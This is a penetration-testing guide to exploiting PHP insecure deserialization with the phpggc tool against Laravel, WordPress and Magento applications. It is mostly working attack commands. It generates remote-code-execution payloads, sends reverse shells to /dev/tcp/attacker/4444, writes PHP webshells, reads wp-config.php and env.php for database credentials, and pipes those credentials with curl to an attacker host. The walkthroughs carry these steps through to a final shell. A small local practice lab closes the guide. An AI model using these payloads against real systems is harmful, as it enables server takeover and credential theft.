# PHP Deserialization with phpggc Guide

> Practical methodology for exploiting PHP insecure deserialization vulnerabilities using phpggc, covering gadget chain exploitation across Laravel, WordPress, Magento, and other popular PHP frameworks.

## Introduction and Objectives

PHP deserialization vulnerabilities occur when user-controlled data is passed to the `unserialize()` function, allowing attackers to inject crafted PHP objects that trigger magic methods (`__wakeup`, `__destruct`, `__toString`) and chain them into remote code execution. The phpggc (PHP Generic Gadget Chains) tool automates payload generation for dozens of popular PHP frameworks and libraries.

This guide covers:

- Understanding PHP serialization format and magic method exploitation
- Selecting and generating gadget chains with phpggc for Laravel, WordPress, and Magento
- Payload delivery through cookies, POST parameters, and phar wrappers
- Type juggling and property injection techniques
- Full exploitation walkthroughs for real-world scenarios

### Prerequisites

- PHP CLI installed (7.x or 8.x) for phpggc execution
- phpggc cloned from the official repository
- Burp Suite or similar proxy for request manipulation
- Understanding of PHP object-oriented programming and magic methods

## 1. PHP Serialization Format Fundamentals

### Understanding the Format

PHP serialization uses a compact string-based format where data types are represented by single-letter prefixes.

```bash
# PHP serialization format examples:
# String:   s:5:"hello";
# Integer:  i:42;
# Float:    d:3.14;
# Boolean:  b:1;
# Null:     N;
# Array:    a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
# Object:   O:8:"ClassName":1:{s:3:"key";s:5:"value";}

# Encode and decode PHP serialized data
php -r 'echo serialize(["user"=>"admin","role"=>"superadmin"]);'
# Output: a:2:{s:4:"user";s:5:"admin";s:4:"role";s:10:"superadmin";}

php -r 'var_dump(unserialize(\"a:2:{s:4:\"user\";s:5:\"admin\";s:4:\"role\";s:10:\"superadmin\";}\"));'

# Identify PHP serialization in HTTP traffic
# Common locations:
# - Session cookies (PHPSESSID companion cookies)
# - POST parameters with serialized arrays
# - Hidden form fields
# - Database-stored serialized data exposed via API
# - Cache keys using serialized storage
```

### PHP Magic Methods as Gadget Entry Points

PHP magic methods are automatically invoked during the object lifecycle, making them the entry and exit points for deserialization gadget chains.

```bash
# Key magic methods exploited in deserialization:
# __wakeup()    - Called during unserialize()
# __destruct()  - Called when object is destroyed (end of request)
# __toString()  - Called when object is used as a string (e.g., in print/echo)
# __call()      - Called when inaccessible method is invoked
# __get()       - Called when inaccessible property is accessed
# __set()       - Called when inaccessible property is written
# __invoke()    - Called when object is used as a function

# Demonstrate __wakeup trigger
php -r '
class Evil {
    function __wakeup() {
        echo "wakeup called!\n";
        system("id");
    }
}
$payload = serialize(new Evil());
echo "Payload: $payload\n";
// unserialize($payload) would trigger __wakeup() and execute "id"
'
# Output: O:4:"Evil":0:{}
```

### Identifying Deserialization Entry Points

```bash
# Search source code for unserialize() calls
grep -rn "unserialize(" /path/to/target/source/
grep -rn "unserialize(" --include="*.php" /path/to/target/source/

# Check if input reaches unserialize() without validation
# Look for patterns like:
# unserialize($_GET['data'])
# unserialize($_POST['data'])
# unserialize($_COOKIE['prefs'])
# unserialize(base64_decode($input))

# Quick test injection - inject invalid serialized object
# If PHP errors appear, deserialization is happening
curl -X POST http://target/api \
  -d 'data=O:1:"X":0:{}'
# Look for: "Class 'X' not found" or similar errors

# Common cookie-based entry points
# Laravel: laravel_session (encrypted, but check for custom cookies)
# WordPress: wp_settings (serialized preferences)
# Magento: section_data_id, mage-cache-sessid
# Custom: prefs, settings, user_data, cart, config
```

## 2. phpggc Installation and Chain Discovery

### Setup

```bash
# Clone phpggc repository
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Verify installation
php phpggc -l | head -20

# Update to latest version with new chains
git pull origin master

# Check PHP version compatibility
php -v
# phpggc requires PHP 7.x+ for most chains
```

### Listing and Selecting Chains

```bash
# List all available gadget chains
php phpggc -l

# Filter chains by framework
php phpggc -l | grep -i laravel
php phpggc -l | grep -i wordpress
php phpggc -l | grep -i magento
php phpggc -l | grep -i symfony
php phpggc -l | grep -i guzzle
php phpggc -l | grep -i monolog
php phpggc -l | grep -i doctrine

# Show detailed chain information
php phpggc -i Laravel/RCE1
php phpggc -i Magento/RCE1

# The -i flag shows:
# - Target framework/library
# - Required dependencies and versions
# - Chain type (RCE, FileWrite, etc.)
# - Gadget path through classes
```

## 3. Laravel Deserialization Exploitation

### Laravel Chain Overview

Laravel is the most popular PHP framework and provides multiple gadget chains through its extensive dependency tree. Even if the application does not directly call `unserialize()`, third-party packages may expose deserialization entry points.

```bash
# Available Laravel chains
php phpggc -l | grep -i laravel
# Laravel/RCE1 - RCE via Monolog chain
# Laravel/RCE2 - RCE via different gadget path
# Laravel/RCE3 - RCE via Ignition middleware
# Laravel/RCE4 - RCE via PendingCommand
# Laravel/RCE5 - RCE via ReturnCallback
# Laravel/RCE6 - RCE via LazyCollection
# Laravel/RCE7 - RCE via Batch fake
# Laravel/RCE8 - RCE via queue batch
```

### Generating Laravel RCE Payloads

```bash
# Basic command execution
php phpggc Laravel/RCE1 'system("id")'

# With base64 encoding for safe transport
php phpggc -b Laravel/RCE1 'system("whoami")'

# URL-encoded for GET parameter injection
php phpggc -u Laravel/RCE1 'system("id")'

# Both base64 and URL-encoding
php phpggc -b -u Laravel/RCE1 'system("cat /etc/passwd")'

# Reverse shell payload
php phpggc -b Laravel/RCE1 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'

# File write for webshell deployment
php phpggc Laravel/RCE1 'file_put_contents("/var/www/html/shell.php","<?php system(\$_GET[0]); ?>")'

# Callback-based confirmation
php phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/laravel-callback")'
```

### Laravel-Specific Attack Vectors

```bash
# Laravel Ignition (CVE-2021-3129) - log file poisoning + phar deserialization
# This is NOT pure deserialization but uses phar wrapper as trigger

# Step 1: Generate phar payload with phpggc
php phpggc -p phar Monolog/RCE1 'system("id")' -o /tmp/evil.phar

# Step 2: The phar can be triggered via:
# file_get_contents("phar://path/to/evil.phar")
# file_exists("phar://path/to/evil.phar")
# Any PHP file operation with phar:// wrapper

# Laravel session driver deserialization (if using file driver with predictable path)
# Step 1: Forge session file content
php phpggc -b Laravel/RCE1 'system("id")'
# Step 2: Write to session file path (if file upload allows path traversal)
# Step 3: Session file is automatically unserialized by Laravel

# Laravel queue job deserialization
# If application processes queued jobs from user-controlled input
php phpggc -b Laravel/RCE4 'system("whoami")'
# Inject into Redis/database queue for processing
```

## 4. WordPress Deserialization Exploitation

### WordPress Chain Analysis

WordPress core is generally resistant to deserialization attacks due to its use of `maybe_unserialize()` with proper validation. However, plugins frequently introduce vulnerabilities.

```bash
# WordPress-related chains
php phpggc -l | grep -i wordpress
php phpggc -l | grep -i woo

# WordPress Generic RCE chain
php phpggc WordPress/Generic 'system("id")'

# WooCommerce chains
php phpggc WooCommerce/RCE1 'system("cat /var/www/html/wp-config.php")'

# WordPress file write for plugin installation
php phpggc WordPress/Generic 'file_put_contents("/var/www/html/wp-content/plugins/evil/evil.php","<?php system(\$_GET[0]); ?>")'

# Read wp-config.php for database credentials
php phpggc -b WordPress/Generic 'system("cat /var/www/html/wp-config.php | base64")'
```

### WordPress Plugin Deserialization Patterns

```bash
# Common vulnerable plugin patterns to look for:
# 1. unserialize() on user meta or option values
# 2. Custom serialization in plugin settings
# 3. Import/export functionality using serialized data
# 4. REST API endpoints accepting serialized data

# Test WordPress XMLRPC for deserialization
curl -X POST http://target/xmlrpc.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'

# Check for vulnerable plugins via known CVEs
# Search wp-content/plugins/ directory for unserialize calls
# Example: grep -rn "unserialize" wp-content/plugins/vulnerable-plugin/

# WordPress options deserialization (requires admin access)
# wp_options table stores serialized data in option_value column
# Some options are deserialized on every page load
```

## 5. Magento Deserialization Exploitation

### Magento Chain Overview

Magento (both 1.x and 2.x) has historically been a major target for deserialization attacks due to its extensive use of serialized data in checkout, cart, and caching mechanisms.

```bash
# Magento chains available
php phpggc -l | grep -i magento
# Magento/RCE1 - Magento 1.x RCE
# Magento/RCE2 - Magento 1.x alternative chain
# Magento2/RCE1 - Magento 2.x RCE

# Generate Magento 1.x RCE payload
php phpggc Magento/RCE1 'id'

# Magento 2.x RCE
php phpggc Magento2/RCE1 'system("cat /app/etc/env.php")'

# URL-encode for POST injection
php phpggc -u Magento/RCE1 'curl http://attacker/$(whoami)'

# Base64 for cookie injection
php phpggc -b Magento/RCE1 'cat /etc/passwd'

# Magento database credential extraction
php phpggc -b Magento2/RCE1 'system("cat /var/www/html/app/etc/env.php")'
```

### Magento Attack Vectors

```bash
# Magento checkout/cart serialization
# Cart data is often serialized in session or database
# Look for: serialized arrays in cookie parameters

# Magento cache deserialization
# Magento caches full page content including serialized objects
# If cache storage (Redis, file) is accessible, inject malicious data

# Magento API deserialization
# REST API endpoints accept JSON/XML which may trigger deserialization
curl -X POST http://target/rest/V1/guest-carts \
  -H 'Content-Type: application/json' \
  -d 'SERIALIZED_PAYLOAD_HERE'

# Magento CVE-2016-4010 (unserialize RCE via checkout)
# Step 1: Add item to cart
# Step 2: Inject serialized payload into cart parameters
# Step 3: Checkout triggers deserialization

# Magento 2 UI component deserialization
# UI components accept serialized filter/sorting parameters
curl -X POST http://target/admin/admin/dashboard/index/key/KEY/ \
  -d 'filters=SERIALIZED_PAYLOAD'
```

## 6. Type Juggling and Property Injection

### PHP Type Juggling in Deserialization Context

```bash
# PHP type juggling can bypass integrity checks on serialized data
# "0 == "admin"" is true in PHP loose comparison

# Exploit type juggling in serialized data validation
# If application checks: if ($data['role'] == 'admin')
# Inject integer 0 which loosely equals string "admin"
php -r 'echo serialize(["role" => 0]);'
# Output: a:1:{s:4:"role";i:0;}

# Property type confusion
# PHP allows setting properties of any type regardless of type hints
# during deserialization (before __wakeup validation)

# Craft payload with mismatched property types
php -r '
class User {
    public $role = "guest";
    public $isAdmin = false;
}
$u = new User();
$u->role = "admin";
$u->isAdmin = true;
echo serialize($u);
'
# O:4:"User":2:{s:4:"role";s:5:"admin";s:7:"isAdmin";b:1;}
```

### POP Chain Construction

```bash
# Manual POP (Property Oriented Programming) chain construction
# When phpggc does not have a chain for the target application

# Step 1: Identify sink gadgets (dangerous operations)
# Look for: system(), exec(), file_put_contents(), eval(), include()
# in __destruct(), __wakeup(), __toString() methods

# Step 2: Identify source gadgets (entry points)
# Look for classes with __wakeup() or __destruct() that call
# methods on their properties

# Step 3: Build chain connecting source to sink
# Example manual chain construction:
php -r '
class Logger {
    public $logFile;
    public $logData;
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}
class Template {
    public $templateFile;
    function __toString() {
        return file_get_contents($this->templateFile);
    }
}
// Build chain: Logger.__destruct() writes Template object as string
// Template.__toString() reads file
$l = new Logger();
$l->logFile = "/var/www/html/s.php";
$l->logData = "<?php system(\$_GET[0]); ?>";
echo serialize($l);
'

# Step 4: Analyze target application for custom POP chains
grep -rn "__destruct\|__wakeup\|__toString\|__call" --include="*.php" /path/to/target/
```

## 7. Full Exploitation Walkthrough

### Scenario: Laravel Application with Cookie Deserialization

```bash
# Step 1: Identify Laravel application
curl -sI http://target/ | grep -i laravel
# Set-Cookie: laravel_session=eyJp...

# Step 2: Find deserialization entry point
# Laravel middleware that processes user cookies
# Check for custom cookies beyond laravel_session
curl -sI http://target/ -D headers.txt
cat headers.txt | grep -i cookie

# Step 3: Determine Laravel version
curl -s http://target/ | grep -o 'Laravel v[0-9.]*'
# Check composer.json if accessible
curl -s http://target/composer.json

# Step 4: Generate test payload with callback
php phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/test-callback")'

# Step 5: Inject into identified cookie parameter
curl -s http://target/ \
  -H 'Cookie: custom_data=BASE64_PAYLOAD_HERE' \
  -o /dev/null -w '%{http_code}'

# Step 6: Check callback server for request
# If callback received, deserialization confirmed

# Step 7: Generate RCE payload
php phpggc -b Laravel/RCE1 'system("id > /tmp/rce-proof")'

# Step 8: Escalate to reverse shell
php phpggc -b Laravel/RCE5 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'

# Step 9: Set up listener
nc -lvnp 4444

# Step 10: Send final payload
curl -s http://target/ \
  -H 'Cookie: custom_data=REVERSE_SHELL_PAYLOAD'
```

### Scenario: Magento 2 Checkout Deserialization

```bash
# Step 1: Identify Magento 2
curl -s http://target/ | grep -i magento

# Step 2: Find checkout serialization points
# Magento serializes cart data, shipping methods, payment info
# Monitor HTTP traffic during checkout process

# Step 3: Generate Magento 2 payload
php phpggc -b Magento2/RCE1 'system("cat /app/etc/env.php | base64 -w0 | curl -X POST -d @- http://attacker/exfil")'

# Step 4: Inject into cart/shipping parameter
curl -X POST http://target/rest/V1/guest-carts/CART_ID/shipping-information \
  -H 'Content-Type: application/json' \
  -d '{"addressInformation":{"shipping_address_code":"MALICIOUS_SERIALIZED_DATA"}}'

# Step 5: Verify data exfiltration on callback server
```

## Hands-on Exercise

### Lab Setup: Vulnerable PHP Application

Build a minimal vulnerable PHP application for safe practice:

```bash
# Create vulnerable test application
cat > /tmp/vuln_app/index.php << 'PHPEOF'
<?php
// VULNERABLE: Never do this in production!
if (isset($_COOKIE['user_data'])) {
    $data = base64_decode($_COOKIE['user_data']);
    $user = unserialize($data);
    echo "Welcome, " . htmlspecialchars($user['name'] ?? 'guest');
}
?>
<form method="POST">
    <input name="name" placeholder="Name">
    <button>Login</button>
</form>
PHPEOF

# Start PHP development server
cd /tmp/vuln_app && php -S localhost:8080

# Test basic injection
curl -s -b "user_data=$(php -r 'echo base64_encode(serialize([\"name\"=>\"admin\",\"role\"=>\"super\"]));')" \
  http://localhost:8080/

# Test with phpggc payload (requires matching libraries)
php phpggc -b Monolog/RCE1 'system("id")' | xargs -I{} curl -s -b "user_data={}" http://localhost:8080/
```

## References and Resources

- **phpggc GitHub**: https://github.com/ambionics/phpggc -- Official phpggc repository with all chains
- **PHP Serialization Format**: https://www.php.net/manual/en/language.oop5.magic.php -- PHP magic methods documentation
- **OWASP PHP Deserialization**: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection -- OWASP PHP Object Injection guide
- **PortSwigger PHP Deserialization**: https://portswigger.net/web-security/deserialization -- Labs and tutorials
- **Laravel CVE-2021-3129**: https://github.com/ambionics/laravel-exploits -- Laravel Ignition exploitation tools
- **Magento Security Advisories**: https://magento.com/security/patches -- Official Magento security patches
- **PHP unserialize() Documentation**: https://www.php.net/manual/en/function.unserialize.php -- Official documentation with security notes
- **Ambionics Blog**: https://www.ambionics.io/blog -- Research blog by phpggc author with advanced techniques
- **Magento SUPEE Patch Analysis**: https://magento.com/security -- Security patch notes revealing deserialization fixes
- **PHP Phar Deserialization**: https://blog.ripstech.com/2018/php-phar-deserialization-vulnerabilities-basics/ -- Phar wrapper exploitation techniques
